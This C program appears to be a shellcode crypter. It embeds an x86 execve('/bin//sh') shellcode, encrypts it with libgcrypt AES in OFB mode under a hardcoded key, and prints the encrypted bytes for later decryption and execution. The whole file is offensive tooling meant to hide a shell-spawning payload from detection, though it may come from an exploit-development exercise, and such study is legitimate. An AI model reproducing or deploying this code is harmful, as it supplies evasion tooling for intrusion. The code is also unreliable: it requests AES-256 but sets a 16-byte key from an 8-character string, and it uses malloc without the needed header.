#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <gcrypt.h>

//Hardcoded password
const char *key = "iamjboyy";
//Setup IV
uint8_t iv[16] = {0x05}; 
//execve-stack
uint8_t shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";

int main(){

    int i, cipher = gcry_cipher_map_name("aes256");
    size_t len = strlen(shellcode);
    uint8_t *encrypt = malloc(len);
    
    gcry_cipher_hd_t hd;
    //Open cipher
    gcry_cipher_open(&hd, cipher, GCRY_CIPHER_MODE_OFB, 0);
    //Set key for cipher
    gcry_cipher_setkey(hd, key, 16);
    //Set iv
    gcry_cipher_setiv(hd, iv, 16);
	  //Encrypt
    gcry_cipher_encrypt(hd, encrypt, len, shellcode, len);
     
    printf("Encrypted shellcode: \n");
    for(i=0; i<len; i++){
		printf("\\x%02x", encrypt[i]);
    }
    printf("\n");

    return 0;
}
